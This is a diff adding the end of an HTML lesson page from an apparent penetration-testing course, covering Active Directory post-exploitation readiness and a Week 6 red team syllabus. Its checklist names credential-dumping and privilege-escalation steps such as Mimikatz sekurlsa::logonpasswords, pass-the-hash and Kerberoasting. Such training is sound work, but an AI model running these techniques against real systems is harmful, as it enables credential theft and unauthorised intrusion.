+      <div class="clbl">WEEK 6 — RED TEAM TECHNIQUES</div>
+      <ul class="ck">
+        <li>AV evasion: shellcode encoding, obfuscation, process injection</li>
+        <li>AMSI bypass — defeating PowerShell antivirus scanning</li>
+        <li>C2 frameworks: Sliver, Havoc — modern red team infrastructure</li>
+        <li>Custom payload development with msfvenom and C#</li>
+        <li>Wireless attacks: WPA2 cracking, evil twin, deauth</li>
+        <li>Full red team engagement report writing</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">CERTIFICATIONS THIS WEEK PREPARES YOU FOR</div>
+      <ul class="ck">
+        <li><strong>PNPT</strong> (TCM Security) — practical AD compromise is 70% of the exam</li>
+        <li><strong>OSCP</strong> — privesc and lateral movement on every machine</li>
+        <li><strong>CRTO</strong> (Red Team Ops) — C2 frameworks, AD attacks, evasion</li>
+        <li><strong>CRTE</strong> (Red Team Expert) — advanced AD, forest attacks, trust abuse</li>
+        <li><strong>CEH</strong> — covers all attack types at conceptual level</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">✅</div>
+    <p><strong>Week 5 Readiness Check:</strong> Before Week 6, verify you can: (1) Run linpeas on a Linux machine and identify + exploit at least one SUID binary using GTFOBins. (2) Use GodPotato or PrintSpoofer to escalate from a service account to SYSTEM on Windows. (3) Extract credentials with Mimikatz sekurlsa::logonpasswords and use the NTLM hash for Pass-the-Hash with CrackMapExec. (4) Run Kerberoasting with impacket-GetUserSPNs and crack the resulting hash with Hashcat mode 13100. (5) Complete at least one HackTheBox Active Directory machine (Active, Forest, or Sauna) independently.</p>
+  </div>
+</div><!-- /p6 -->
+
+</div><!-- .wrap -->
+
+<footer>PHASE 3 · WEEK 5 COMPLETE · POST-EXPLOITATION & ACTIVE DIRECTORY · NEXT: WEEK 6 — RED TEAM TECHNIQUES & AV EVASION</footer>
+
+<script>
+function show(i){
+  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.dtab').forEach(t=>t.classList.remove('on'));
+  document.getElementById('p'+i).classList.add('on');
+  document.querySelectorAll('.dtab')[i].classList.add('on');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function qa(el,type,exp){
+  const q=el.closest('.qb');
+  if(q.dataset.done)return;
+  q.dataset.done='1';
+  q.querySelectorAll('.qo').forEach(o=>{o.style.pointerEvents='none';o.style.opacity='0.4';});
+  el.style.opacity='1';el.classList.add(type);
+  const fb=q.querySelector('.qfb');
+  if(fb){fb.classList.add('show',type);fb.textContent=exp;}
+}
+</script>
+
+<div class="week-nav" style="border-top-color:var(--border,#141b26);max-width:1160px;margin:2rem auto 0;padding:2rem;display:flex;justify-content:space-between;align-items:center;">
+  <a href="week4.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">← Previous Week</a>
+  <a href="../index.html" style="color:var(--teal,#2dd4bf);border-color:rgba(45,212,191,0.3);">⌂ Lesson Hub</a>
+  <a href="week6.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">Next Week →</a>
+</div>
+
+<a href="#" id="back-to-top" title="Back to top">↑</a>
+
+<script src="../js/shared.js"></script>
+</body>
+</html>
